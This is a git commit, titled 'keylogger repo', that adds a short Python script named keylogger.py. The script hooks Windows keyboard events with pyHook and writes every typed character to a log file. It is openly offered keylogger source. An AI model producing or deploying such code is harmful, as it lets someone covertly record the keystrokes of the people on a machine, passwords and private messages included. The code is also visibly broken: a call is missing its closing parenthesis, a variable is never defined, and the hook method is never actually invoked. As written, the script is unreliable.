d9ab0f74889009f9407f7753e657f4078bcf090f
otitoju <otitojuoluwapelumi@gmail.com>
2018-05-16 01:43:45 -0700

    keylogger repo

---
+++ keylogger.py
@@ -0,0 +1,10 @@
+import pyHook,pythoncom,sys,logging
+def onKeyboardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s'
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown=onKeyboardEvent
+hooks_manager.HookKeyboard
+pythoncom.PumpMessages()
